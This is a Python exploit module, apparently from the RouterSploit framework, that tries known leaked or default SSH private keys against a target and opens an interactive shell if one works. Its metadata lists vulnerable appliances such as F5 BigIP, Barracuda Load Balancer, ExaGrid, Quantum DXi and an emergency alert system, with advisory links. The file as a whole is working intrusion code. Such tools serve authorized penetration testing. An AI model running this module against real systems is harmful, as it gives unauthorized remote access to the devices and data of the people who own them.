import os
import json
from routersploit.core.exploit import *
from routersploit.core.ssh.ssh_client import SSHClient


class Exploit(SSHClient):
    __info__ = {
        "name": "Multi SSH Authorized Keys",
        "description": "Module exploits private key exposure vulnerability. If the target is "
                       "vulnerable it is possible to authentiate to the device.",
        "authors": (
            "xistence <xistence[at]0x90.nl>",  # Quantum DXi V1000, Array Networks, Loadbalancer.org Enterprise VA 7.5.2 vulnerability discovery
            "Cristiano Maruti (@cmaruti)",  # Baracuda Load Balancer vulnerabiltiy discovery
            "Jasper Greve",  # Ceragon FibeAir IP-10 vulnerability doscovery
            "HD Moore",  # Ceragon FibeAir IP-10 vulnerability discovery
            "Matta Consulting",  # F5 BigIP
            "egypt",  # ExaGrid
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/rapid7/ssh-badkeys",
            "http://packetstormsecurity.com/files/125761/Array-Networks-vxAG-xAPV-Privilege-Escalation.html",
            "http://seclists.org/fulldisclosure/2015/Jan/76",
            "https://github.com/cmaruti/reports/raw/master/barracuda_load_balancer_vm.pdf",
            "https://gist.github.com/todb-r7/5d86ecc8118f9eeecc15",
            "https://www.trustmatta.com/advisories/MATTA-2012-002.txt",
            "https://community.rapid7.com/community/metasploit/blog/2012/06/11/scanning-for-vulnerable-f5-bigips-with-metasploit",
            "http://packetstormsecurity.com/files/125754/Loadbalancer.org-Enterprise-VA-7.5.2-Static-SSH-Key.html",
            "https://www.kb.cert.org/vuls/id/662676",
            "http://packetstormsecurity.com/files/125755/quantum-root.txt",
            "https://github.com/mitchellh/vagrant/tree/master/keys",
            "https://community.rapid7.com/community/infosec/blog/2016/04/07/r7-2016-04-exagrid-backdoor-ssh-keys-and-hardcoded-credentials",
        ),
        "devices": (
            "ExaGrid firmware < 4.8 P26",
            "Quantum DXi V1000",
            "Array Networks vxAG 9.2.0.34 and vAPV 8.3.2.17 appliances",
            "Barracuda Load Balancer",
            "Ceragon FibeAir IP-10",
            "F5 BigIP",
            "Loadbalancer.org Enterprise VA 7.5.2",
            "Digital Alert Systems DASDEC and Monroe Electronics One-Net E189 Emergency Alert System",
            "Vagrant",
        ),
    }
    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")

    def __init__(self):
        self.valid = None
        self.private_keys = []

        ssh_keys_path = os.path.join(utils.RESOURCES_DIR, "ssh_keys")
        ssh_keys = [".".join(filename.split(".")[:-1]) for filename in os.listdir(ssh_keys_path) if filename.endswith(".json")]

        for ssh_key in ssh_keys:
            path = "{}/{}.json".format(ssh_keys_path, ssh_key)
            with open(path, "r") as f:
                data = json.load(f)

            path = "{}/{}.key".format(ssh_keys_path, ssh_key)
            with open(path, "r") as f:
                data["priv_key"] = f.read()

            self.private_keys.append(data)

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            ssh_client = self.ssh_create()
            if ssh_client.login_pkey(self.valid["username"], self.valid["priv_key"]):
                ssh_client.interactive()
                ssh_client.close()
            else:
                print_error("Exploit failed - target seems to be not vulnerable")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for key in self.private_keys:
            ssh_client = self.ssh_create()
            if ssh_client.login_pkey(key["username"], key["priv_key"]):
                ssh_client.close()
                self.valid = key
                return True  # target is vulnerable

        return False  # target is not vulnerable
